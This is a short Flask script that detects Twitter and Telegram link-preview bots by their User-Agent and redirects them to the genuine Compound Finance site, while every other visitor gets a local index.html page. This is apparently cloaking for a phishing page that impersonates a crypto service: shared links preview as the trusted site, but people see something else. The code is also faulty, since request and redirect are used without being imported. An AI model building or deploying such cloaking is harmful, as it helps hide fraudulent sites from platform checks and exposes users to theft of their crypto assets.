from flask import Flask, render_template

app = Flask(__name__)

@app.route('/')
def index():
    user_agent = request.headers.get('User-Agent').strip('\r\n')
    print(user_agent)
    if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent:
        return redirect('https://compound.finance/')
    else:
        return render_template('index.html')

if __name__ == '__main__':
  app.run()
